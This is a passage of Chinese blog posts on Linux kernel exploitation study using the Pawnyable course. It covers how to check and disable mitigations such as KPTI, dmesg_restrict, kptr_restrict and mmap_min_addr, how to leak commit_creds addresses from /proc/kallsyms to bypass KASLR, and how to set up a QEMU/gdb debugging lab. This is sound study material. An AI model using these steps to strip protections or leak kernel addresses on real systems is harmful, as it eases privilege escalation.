保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。 查看开启状态 # 方法1: / # cat /proc/cpuinfo | grep pti fpu_exception : yes lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/cpuinfo | grep pti fpu_exception : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities fpu_exception : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities fpu_exception : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities fpu_exception : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities # 方法2: / # dmesg | grep 'page table' // 这个在LK01的qemu上没有回显 / # lzx@ubuntu:~/LKPWN/pawnyable$ dmesg | grep 'page table' // Host [ 0.381988] Kernel/User page tables isolation: enabled [ 4.059612] x86/mm: Checking user space page tables qemu开启和关闭 如果是使用 qemu 启动的内核，在 -append 选项中添加 kpti=1 来开启 KPTI。 如果是使用 qemu 启动的内核，在 -append 选项中添加 nopti 来关闭 KPTI。 绕过 见ctf-wiki，后面遇到例子再细看。 CPU 漏洞缓解技术 前面提到KPTI是为了Meltdown漏洞而提出的。像Meltdown这些处理器级别的漏洞，虽然无法对已有硬件修复，但也会从软件层面用一些技术做缓解，路径 /sys/devices/system/cpu/vulnerabilities/ 下列出了所有针对 CPU 漏洞的缓解技术： lzx@ubuntu:~/LKPWN/pawnyable$ ls /sys/devices/system/cpu/vulnerabilities/ itlb_multihit l1tf mds meltdown mmio_stale_data retbleed spec_store_bypass spectre_v1 spectre_v2 srbds tsx_async_abort lzx@ubuntu:~/LKPWN/pawnyable$ cat /sys/devices/system/cpu/vulnerabilities/* KVM: Vulnerable Mitigation: PTE Inversion Mitigation: Clear CPU buffers; SMT Host state unknown Mitigation: PTI Mitigation: Clear CPU buffers; SMT Host state unknown Mitigation: IBRS Mitigation: Speculative Store Bypass disabled via prctl and seccomp Mitigation: usercopy/swapgs barriers and __user pointer sanitization Mitigation: IBRS, IBPB: conditional, RSB filling, PBRSB-eIBRS: Not affected Unknown: Dependent on hypervisor status Not affected 每个文件对应一个漏洞，并且文件内容的字段有三种： Vulnerable：CPU 存在该漏洞，并且没有缓解技术 Not affected：该漏洞不存在 Mitigation：漏洞存在，并使用了缓解技术（对应的值就是具体技术） 比如 Meltdown 漏洞： lzx@ubuntu:~/LKPWN/pawnyable$ cat /sys/devices/system/cpu/vulnerabilities/meltdown Mitigation: PTI 表示使用了 PTI 缓解技术，实际上就是 KPTI，表示当前的系统已经启用了 KPTI。 堆块隔离（Inside Kernel） 如果在使用 kmem_cache_create 创建一个 cache 时，传递了 **SLAB_ACCOUNT** 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。 Currently, if we want to account all objects of a particular kmem cache, we have to pass __GFP_ACCOUNT to each kmem_cache_alloc call, which is inconvenient. This patch introduces SLAB_ACCOUNT flag which if passed to kmem_cache_create will force accounting for every allocation from this cache even if __GFP_ACCOUNT is not passed. This patch does not make any of the existing caches use this flag - it will be done later in the series. Note, a cache with SLAB_ACCOUNT cannot be merged with a cache w/o SLAB_ACCOUNT, i.e. using this flag will probably reduce the number of merged slabs even if kmem accounting is not used (only compiled in). 在早期，许多结构体（如 cred 结构体）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache。在 Linux 4.5 版本引入了这个 flag 后，许多结构体就单独使用了自己的 cache。然而，根据上面的描述，这一特性似乎最初并不是为了安全性引入的。 访问控制 dmesg_restrict（信息泄露） 限制内核日志暴露，以防绕过KASLR。内核日志中可能会有一些地址信息或者敏感信息，所以需要对内核日志的访问进行限制。dmesg_restrict可用来决定是否限制非特权用户使用dmesg查看内核日志缓冲区中的消息。 值为0时，非特权用户对内核日志的查看将不受限制； 值为1时，只有具有CAP_SYSLOG特权的用户才能查看内核日志。 查看开启状态 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/kernel/dmesg_restrict 0 开启 从上面查看开启状态可看出，dmesg_restrict默认是关闭的，非特权用户能够读取到内核日志： lzx@ubuntu:~/LKPWN/pawnyable$ whoami lzx lzx@ubuntu:~/LKPWN/pawnyable$ grep CapEff /proc/self/status CapEff: 0000000000000000 lzx@ubuntu:~/LKPWN/pawnyable$ dmesg | tail -n 3 [20382.441195] usb 2-2.1: reset full-speed USB device number 4 using uhci_hcd [33640.723833] e1000: ens33 NIC Link is Down [33644.753863] e1000: ens33 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None 开启的方法就是将dmesg_restrict的值设置为1，然后非特权用户就不被允许读取内核日志了： lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 1 &gt; /proc/sys/kernel/dmesg_restrict&quot; lzx@ubuntu:~/LKPWN/pawnyable$ dmesg | tail -n 3 dmesg: read kernel buffer failed: Operation not permitted 此时，只要具备了CAP_SYSLOG权限，依然能够读取内核日志： lzx@ubuntu:~/LKPWN/pawnyable$ grep CapEff /proc/self/status CapEff: 0000000000000000 lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;grep CapEff /proc/self/status&quot; [sudo] password for lzx: CapEff: 0000003fffffffff lzx@ubuntu:~/LKPWN/pawnyable$ capsh --decode=0000003fffffffff | grep &quot;cap_syslog&quot; 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read lzx@ubuntu:~/LKPWN/pawnyable$ sudo dmesg | tail -n 3 [20382.441195] usb 2-2.1: reset full-speed USB device number 4 using uhci_hcd [33640.723833] e1000: ens33 NIC Link is Down [33644.753863] e1000: ens33 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None 那么，设置dmesg_restrict限制有什么意义呢？dmesg_restrict的设置是为了避免非特权用户利用内核日志泄露的敏感信息绕过KASLR机制。我们知道，KASLR只是将内核基址在启动时做了随机化处理，但是内核中各符号之间的相对偏移是不受KASLR影响的。因此，只要能够获得内核基址或某符号地址，再结合偏移量，就能够计算出其他符号的准确地址，从而绕过KASLR。 例如，在以前的Linux环境下，我们可以直接从dmesg中获得内核基址： dmesg | grep 'Freeing SMP' 能获得类似下面一样的输出： Freeing SMP alternatives memory: 32K (ffffffff9e309000 - ffffffff9e311000) 其中，ffffffff9e309000就是内核基址了。然而，后来的一个内核补丁使得内核隐去了基址信息。补丁如下： diff --git a/mm/page_alloc.c b/mm/page_alloc.c index 2b3bf67..3f63973 100644 --- a/mm/page_alloc.c +++ b/mm/page_alloc.c @@ -6508,8 +6508,8 @@ unsigned long free_reserved_area(void *start, void *end, int poison, char *s) } if (pages &amp;&amp; s) - pr_info(&quot;Freeing %s memory: %ldK (%p - %p)\\n&quot;, - s, pages &lt;&lt; (PAGE_SHIFT - 10), start, end); + pr_info(&quot;Freeing %s memory: %ldK\\n&quot;, + s, pages &lt;&lt; (PAGE_SHIFT - 10)); return pages; } 因此，在我的测试环境中，执行上述命令也只能获得以下输出了： lzx@ubuntu:~/LKPWN/pawnyable$ sudo dmesg | grep 'Freeing SMP' [ 0.375721] Freeing SMP alternatives memory: 40K 可见，Linux内核的安全性是在不断提升的。但是，这并不说明dmesg不再能够泄露内核符号地址。在特定的场景下，攻击者可能通过其他手段让内核将某些符号地址主动输出到日志中，从而计算出所需的内核特定符号地址。 关闭 lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/dmesg_restrict&quot; lzx@ubuntu:~/LKPWN/pawnyable$ dmesg | tail -n 3 [20382.441195] usb 2-2.1: reset full-speed USB device number 4 using uhci_hcd [33640.723833] e1000: ens33 NIC Link is Down [33644.753863] e1000: ens33 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: None KADR（kptr_restrict）（信息泄露） KADR（Kernel Address Display Restriction，内核地址显示限制）限制内核符号地址暴露，以防绕过KASLR。此技术通过kptr_restrict的值来决定是否限制通过/proc或其他接口暴露内核中的符号地址（例如，通过/proc/kallsyms接口查看）。 值为0时，非特权用户能够查看内核符号地址（较新版本的内核还需要 perf_event_paranoid&lt;=1）； 值为1时，只有具有CAP_SYSLOG特权的用户才能查看内核符号地址； 值为2时，即使是特权用户也无法查看内核符号地址。 当开启该保护后，攻击者就不能通过 /proc/kallsyms 来获取内核中某些敏感的地址了，如 commit_creds、prepare_kernel_cred。 查看开启状态 可以看到是默认开启的，查看的内核符号地址都是0 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/kernel/kptr_restrict 1 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/kallsyms | tail -n 2 0000000000000000 t cleanup_module [pata_acpi] 0000000000000000 r __mod_pci__pacpi_pci_tbl_device_table [pata_acpi] 开启 lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 1 &gt; /proc/sys/kernel/kptr_restrict&quot; 或者 lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/kptr_restrict&quot; 关闭 可以看到即使（5.4版本内核中）将kptr_restrict设置为0，非特权用户也无法获得内核符号地址。 lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/kptr_restrict&quot; [sudo] password for lzx: lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/kernel/kptr_restrict 0 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/kallsyms | tail -n 2 0000000000000000 t cleanup_module [pata_acpi] 0000000000000000 r __mod_pci__pacpi_pci_tbl_device_table [pata_acpi] lzx@ubuntu:~/LKPWN/pawnyable$ uname -a Linux ubuntu 5.4.0-135-generic #152~18.04.2-Ubuntu SMP Tue Nov 29 08:23:49 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux 原因很简单，还需要再设置一个值。先来看一下内核中与kptr_restrict相关的函数kallsyms_show_value /* * We show kallsyms information even to normal users if we've enabled * kernel profiling and are explicitly not paranoid (so kptr_restrict * is clear, and sysctl_perf_event_paranoid isn't set). * * Otherwise, require CAP_SYSLOG (assuming kptr_restrict isn't set to * block even that). * * 返回1，表示可以显示内核符号地址；返回0，则表示不能显示 */ int kallsyms_show_value(void) { switch (kptr_restrict) { case 0: // 当kptr_restrict为0时，还需要kallsyms_for_perf()返回1才能return 1 if (kallsyms_for_perf()) return 1; /* fallthrough */ case 1: // 当kptr_restrict为1时，还需要具备CAP_SYSLOG能力才能return 1 if (has_capability_noaudit(current, CAP_SYSLOG)) return 1; /* fallthrough */ default: return 0; } } 可以看到，kptr_restrict为0时，内核还要去判断kallsyms_for_perf函数是否返回真。这个函数就更简单了： static inline int kallsyms_for_perf(void) { #ifdef CONFIG_PERF_EVENTS // 配置了CONFIG_PERF_EVENTS extern int sysctl_perf_event_paranoid; if (sysctl_perf_event_paranoid &lt;= 1) // 且sysctl_perf_event_paranoid&lt;=1 return 1; // 才会 return 1 #endif return 0; } 因此，对于上述版本的内核来说，只有在配置了CONFIG_PERF_EVENTS的情况下，设置kptr_restrict = 0，且设置perf_event_paranoid &lt;= 1，非特权用户才能够获取到内核符号地址。安全性是有所提升的。 再试一下： lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/perf_event_paranoid&quot; lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/kernel/perf_event_paranoid 0 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/kernel/kptr_restrict 0 lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/kallsyms | tail -n 2 ffffffffc004941d t cleanup_module [pata_acpi] ffffffffc004a0c0 r __mod_pci__pacpi_pci_tbl_device_table [pata_acpi] 如上，我们在将perf_event_paranoid设置为0后，非特权用户就能够获得内核符号地址了。 那么，设置kptr_restrict限制有什么意义呢？同dmesg_restrict一样，这主要是为了防止内核符号地址被非特权用户恶意利用——例如，用来绕过KASLR。由于KASLR在系统启动时对内核基址做了随机化处理，攻击者在不进行暴力破解的情况下很难命中内核符号的正确地址，继而无法在Exploit中应用关键内核函数去实现权限提升等操作。如果作为非特权用户的攻击者能够借助/proc/kallsyms等方式获得有效的内核符号地址，KASLR就被绕过了。 例如，攻击者能够借此直接获得权限提升所需的关键内核函数地址： lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/kallsyms | grep 'T commit_creds' ffffffff9becd770 T commit_creds lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/kallsyms | grep 'T prepare_kernel_cred' ffffffff9becdbe0 T prepare_kernel_cred __ro_after_init Linux 内核中有很多数据都只会在 __init 阶段被初始化，而且之后不会被改变。使用 __ro_after_init 标记的内存，在 init 阶段结束后，不能够被再次修改。 可以使用 set_memory_rw(unsigned long addr, int numpages) 来修改对应页的权限。 mmap_min_addr 限制虚拟地址申请下界，以防NULL Pointer Dereference。 mmap_min_addr用来决定是否限制进程通过mmap能够申请到的内存的最小虚拟地址，或者说，限制进程申请的内存虚拟地址范围的下界。 Procfs等伪文件系统是Linux内核向用户态暴露接口的方式之一。mmap_min_addr在Linux下Procfs中对应的文件是/proc/sys/vm/mmap_min_addr。读取该文件即可查询当前系统的mmap_min_addr。 写该文件（需要满足权限要求）即可改变这个限制值。 首先查看一下当前的状态： lzx@ubuntu:~/LKPWN/pawnyable$ whoami lzx lzx@ubuntu:~/LKPWN/pawnyable$ cat /proc/sys/vm/mmap_min_addr 65536 可以发现，进程能够申请的最小地址值为65536。在这种设定下，我们编写以下测试代码去申请零地址处的内存并尝试修改其内容： #include &lt;sys/mman.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; int main(){ char hello = &quot;hello, world&quot;; mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); printf(&quot;mmap succeeded!\\n&quot;); memcpy(0, hello, sizeof(hello)); return 0; } 编译运行，出现了段错误： lzx@ubuntu:~/LKPWN/pawnyable$ vim mmap_min_addr_test.c lzx@ubuntu:~/LKPWN/pawnyable$ gcc mmap_min_addr_test.c -o mmap_min_addr_test ...(有一些告警信息) lzx@ubuntu:~/LKPWN/pawnyable$ ./mmap_min_addr_test mmap succeeded! Segmentation fault (core dumped) 接着，我们修改mmap_min_addr为0，然后再次执行上述程序： lzx@ubuntu:~/LKPWN/pawnyable$ sudo sh -c &quot;echo 0 &gt; /proc/sys/vm/mmap_min_addr&quot; lzx@ubuntu:~/LKPWN/pawnyable$ ./mmap_min_addr_test mmap succeeded! 这次就执行成功了，说明mmap_min_addr的确发挥了作用。**然而mmap_min_addr有什么用处呢？**系统为什么要限制进程申请内存的地址范围下界呢？ 简单来说，mmap_min_addr主要是为了限制空指针解引用（NULL Point Dereference）类型的攻击。为了理解这个问题，我们需要补充两个知识点： Linux系统将虚拟内存空间划分为用户空间和内核空间。以常见的32位系统为例，内核空间在用户空间之上，低地址的3G空间为用户空间；高地址的1G空间为内核空间。因此，空指针对应的零地址实际上是在用户空间范围内。 在大多数C语言实现中，未初始化指针的值为零（即零指针）。 综合起来，设想这样一种情形：攻击者在某程序中找到一个未初始化的函数指针，同时还能够向该程序的零地址处写入数据，那么攻击者就能够通过调用这个函数指针使该程序的控制流转向他写入的恶意指令。退一步讲，即使攻击者不能够控制该程序零地址处的内容，他也有可能通过空指针解引用触发段错误，从而导致程序崩溃，也就是一种拒绝服务攻击。 总结 KASLR：/etc/default/grub SMEP/SMAP/KPTI：/proc/cpuinfo dmesg_restrict：/proc/sys/kernel/dmesg_restrict KADR（kptr_restrict）：/proc/sys/kernel/kptr_restrict mmap_min_addr：/proc/sys/vm/mmap_min_addr SMEP/SMAP需要CPU的支持。 在版本较新的内核中，除了dmesg_restrict，上述漏洞缓解技术往往都处于启用状态。但是在老版本的内核或设备中，受功能限制或处于性能需求，一些漏洞缓解技术可能会被停用。 参考文献 pawnyable - security mechanism 容器环境相关的内核漏洞缓解技术 维基百科 - Supervisor Mode Access Prevention ctf-wiki - defense Linux mem 2.3 内核页表隔离 (KPTI) 详解 Linux 内存安全机制汇总 ","link":"https://lzxzl.github.io/post/pawnyable2-linux-kernel-lou-dong-huan-jie-ji-zhu/"},{"title":"Pawnyable1 - Linux Kernel PWN 简介与调试环境搭建","content":"1 内核漏洞利用的特点 2 调试环境搭建 2.1 启动 ########## 1、安装qemu lzx@ubuntu:~$ sudo apt install qemu-system ########## 2、解压 lzx@ubuntu:~/LKPWN/pawnyable$ tar xzvf LK01.tar.gz LK01/ LK01/qemu/ LK01/qemu/run.sh LK01/qemu/rootfs.cpio LK01/qemu/bzImage LK01/src/ LK01/src/vuln.c LK01/src/vuln.ko LK01/src/Makefile ########## 3、运行run.sh，启动qemu lzx@ubuntu:~/LKPWN/pawnyable$ cd LK01/qemu/ lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ./run.sh qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5] Starting syslogd: OK Starting klogd: OK Running sysctl: OK Saving random seed: OK Starting network: udhcpc: started, v1.34.0 udhcpc: broadcasting discover udhcpc: broadcasting select for 10.0.2.15, server 10.0.2.2 udhcpc: lease of 10.0.2.15 obtained from 10.0.2.2, lease time 86400 deleting routers adding dns 10.0.2.3 OK Starting dhcpcd... dhcpcd-9.4.0 starting DUID 00:01:00:01:2b:94:cc:35:52:54:00:12:34:56 eth0: IAID 00:12:34:56 eth0: soliciting an IPv6 router eth0: Router Advertisement from fe80::2 eth0: adding address fec0::45db:ad18:6e76:7422/64 eth0: adding route to fec0::/64 eth0: adding default route via fe80::2 eth0: soliciting a DHCP lease eth0: offered 10.0.2.15 from 10.0.2.2 eth0: leased 10.0.2.15 for 86400 seconds eth0: adding route to 10.0.2.0/24 eth0: adding default route via 10.0.2.2 forked to background, child pid 105 Boot took 5.67 seconds [ Holstein v1 (LK01) - Pawnyable ] / $ id uid=1337 gid=1337 groups=1337 / $ uname -a Linux zer0pts 5.10.7 #1 SMP PREEMPT Wed Oct 6 21:20:36 JST 2021 x86_64 GNU/Linux LK01.tar.gz 2.2 gdb调试内核 2.2.1 获取root权限 内核启动时会先运行一个程序，此程序根据配置的不同，路径会不同，但在大多数情况下是 /init 和 /sbin/init。该环境下存在/init ，所以会先执行该脚本，那么先来查看qemu中根目录下的init脚本： ########## 1、创建rootfs目录 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ mkdir rootfs ########## 2、使用cpio命令解压cpio文件 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ cd rootfs; cpio -idv &lt; ../rootfs.cpio . sbin sbin/sulogin sbin/setconsole sbin/iptunnel ...... bin/ls bin/base32 tmp run 3928 blocks ########## 3、查看/init脚本 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs$ ls bin dev etc init lib lib64 linuxrc media mnt opt proc root run sbin sys tmp usr var lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs$ cat init #!/bin/sh # devtmpfs does not get automounted for initramfs /bin/mount -t devtmpfs devtmpfs /dev # use the /dev/console device node from devtmpfs if possible to not # confuse glibc's ttyname_r(). # This may fail (E.G. booted with console=), and errors from exec will # terminate the shell, so use a subshell for the test if (exec 0&lt;/dev/console) 2&gt;/dev/null; then exec 0&lt;/dev/console exec 1&gt;/dev/console exec 2&gt;/dev/console fi exec /sbin/init &quot;$@&quot; $@：所有参数列表。如&quot;$@&quot;用「&quot;」括起来的情况、以&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot; 的形式输出所有参数。 https://www.cnblogs.com/fhefh/archive/2011/04/15/2017613.html /init会执行/sbin/init程序： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs$ ls sbin/ -al | grep init lrwxrwxrwx 1 lzx lzx 14 Mar 3 23:27 init -&gt; ../bin/busybox lrwxrwxrwx 1 lzx lzx 14 Mar 3 23:27 run-init -&gt; ../bin/busybox 最后会执行脚本etc/init.d/rcS（虽然没搞懂中间的过程，后面再补吧），该脚本又会执行同目录下的所有S开头的脚本： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs/etc/init.d$ ls rcK rcS S01syslogd S02klogd S02sysctl S20urandom S40network S41dhcpcd S99pawnyable lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs/etc/init.d$ cat rcS #!/bin/sh # Start all init scripts in /etc/init.d # executing them in numerical order. # for i in /etc/init.d/S??* ;do # Ignore dangling symlinks (if any). [ ! -f &quot;$i&quot; ] &amp;&amp; continue case &quot;$i&quot; in *.sh) # Source shell script for speed. ( trap - INT QUIT TSTP set start . $i ) ;; *) # No sh extension, so fork subprocess. $i start ;; esac done 其中有一个脚本S99pawnyable，它关系到qemu虚拟机以什么身份启动。所以下面以root身份启动qemu的时候要改这个脚本： ########## 1、修改etc/init.d/S99pawnyable ########## 1.1 将 setsid 命令的参数 1337 改为 0 ########## 1.2 将 kptr_restrict 所在行注释掉，理由后面讲 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs/etc/init.d$ vim S99pawnyable 12 #echo 2 &gt; /proc/sys/kernel/kptr_restrict &lt;-- 注释掉 13 #echo 1 &gt; /proc/sys/kernel/dmesg_restrict 14 15 ## 16 ## Install driver 17 ## 18 insmod /root/vuln.ko 19 mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0 20 21 ## 22 ## User shell 23 ## 24 echo -e &quot;\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n&quot; 25 echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot; 26 #setsid cttyhack setuidgid 1337 sh &lt;-- 注释掉 27 setsid cttyhack setuidgid 0 sh &lt;-- 1337 改为 0 ########## 2、重新打包rootfs（因为Host中当前用户不是root，所以在命令中加上了选项 --owner=root 选项） lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu/rootfs$ find . -print0 | cpio -o --format=newc --null --owner=root &gt; ../rootfs_updated.cpio 3928 blocks ########## 3、将 run.sh 中 initrd 选项的参数由 rootfs.cpio 改为 rootfs_updated.cpio ########## 4、重新启动 lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ./run.sh qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5] Starting syslogd: OK ...... [ Holstein v1 (LK01) - Pawnyable ] / # id uid=0(root) gid=0(root) groups=0(root) / # 对于命令：setsid cttyhack setuidgid 1337 sh： cttyhack：允许使用 Ctrl+C 等输入的命令。 setuidgid：将用户标识和组标识设置为 1337 sh：并以/bin/sh启动 2.2.2 attach到gdb qemu提供了在gdb中调试的功能，通过设置qemu的-gdb选项，可以指定协议、主机和端口号来监听。比如通过在run.sh中编辑并添加以下选项，就可以在本地主机上的tcp端口1234上监听gdb。 #!/bin/sh qemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel bzImage \\ -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot; \\ -no-reboot \\ -cpu qemu64 \\ -smp 1 \\ -monitor /dev/null \\ -initrd rootfs_updated.cpio \\ -net nic,model=virtio \\ -net user \\ -gdb tcp::1234 重新启动qemu虚拟机，然后在Host里用gdb attach上去： lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ gdb ...... pwndbg&gt; target remote localhost:1234 Remote debugging using localhost:1234 ...... 然后就可以使用gdb调试qemu虚拟机了。如果gdb不知道要调试的目标的架构，那么可以用下面的命令来设置（默认是会自动识别的），这次的架构是x86-64: pwndbg&gt; set arch i386:x86-64:intel The target architecture is assumed to be i386:x86-64:intel 2.2.3 gdb基础调试 先看一下内核加载基址，并获得commit_creds函数的地址。 前面已经将etc/init.d/S99pawnyable 里的 kptr_restrict 所在行注释掉了，这个操作的目的是为了关闭 KADR（Kernel Address Display Restriction）。否则即使是root权限，内核地址也是不可见的。 qemu / # head -n 3 /proc/kallsyms ffffffff81000000 T startup_64 ffffffff81000000 T _stext ffffffff81000000 T _text / # grep &quot;commit_creds&quot; /proc/kallsyms ffffffff8106e390 T commit_creds Host lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ gdb pwndbg&gt; target remote localhost:1234 Remote debugging using localhost:1234 ...... 此时使用gdb为commit_creds函数设置断点：b *0xffffffff8106e390，然后输入c让系统继续运行。接着，在Host里执行一个命令，比如ls。那么控制流就会被gdb中断，断在commit_creds，而后就可以继续进行调试了。 pwndbg&gt; b *0xffffffff8106e390 Breakpoint 1 at 0xffffffff8106e390 pwndbg&gt; c Continuing. Breakpoint 1, 0xffffffff8106e390 in ?? () ...... 第一个参数 RDI 包含一个内核空间指针，看看这个指针指向的内存： pwndbg&gt; p/x $rdi $2 = 0xffff8880032b7200 pwndbg&gt; x/16gx 0xffff8880032b7200 0xffff8880032b7200: 0x0000000000000001 0x0000000000000000 0xffff8880032b7210: 0x0000000000000000 0x0000000000000000 0xffff8880032b7220: 0x0000000000000000 0x0000000000000000 0xffff8880032b7230: 0x000001ffffffffff 0x000001ffffffffff 0xffff8880032b7240: 0x000001ffffffffff 0x0000000000000000 0xffff8880032b7250: 0xffffffff81e32b00 0xffffffff81e32b80 0xffff8880032b7260: 0xffff888002d16540 0x0000000000000000 0xffff8880032b7270: 0x0000000000000000 0x0000000000000000 2.2.4 gdb调试驱动 LK01 加载了一个名为 vuln 的内核模块。可以在/proc/modules找到已加载模块及其基址的列表： / # cat /proc/modules vuln 16384 0 - Live 0xffffffffc0000000 (O) 可以看到名为vuln的模块被加载到 0xfffffffc0000000。该模块的源代码和二进制文件都在目录src中： lzx@ubuntu:~/LKPWN/pawnyable/LK01/src$ ls Makefile vuln.c vuln.ko 如果用ida打开vuln.ko，可以看到其中的函数，比如module_close，它的相对地址是0x20f。 所以，这个函数应该在内核的 0xffffffffc0000000 + 0x20f 处，在这里打个断点： pwndbg&gt; x/4i 0xffffffffc0000000+0x20f 0xffffffffc000020f: push rbp 0xffffffffc0000210: mov rbp,rsp 0xffffffffc0000213: sub rsp,0x10 0xffffffffc0000217: mov QWORD PTR [rbp-0x8],rdi pwndbg&gt; b *(0xffffffffc0000000+0x20f) Breakpoint 1 at 0xffffffffc000020f pwndbg&gt; c Continuing. 从module_initialize可以看出vuln被映射到一个名为/dev/holstein的驱动 在虚拟机终端中执行cat /dev/holstein后控制流将会运行到断点处，触发断点： 如果要在调试时使用驱动程序的符号，则可以使用add-symbol-file 命令，将驱动程序作为第一个参数传递，将基地址作为第二个参数传递，以读取符号信息。然后就可以使用函数名称设置断点了。 pwndbg&gt; add-symbol-file vuln.ko 0xffffffffc0000000 add symbol table from file &quot;vuln.ko&quot; at .text_addr = 0xffffffffc0000000 Reading symbols from vuln.ko...(no debugging symbols found)...done. pwndbg&gt; b module_close Breakpoint 1 at 0xffffffffc0000213 pwndbg&gt; b *module_close Breakpoint 2 at 0xffffffffc000020f 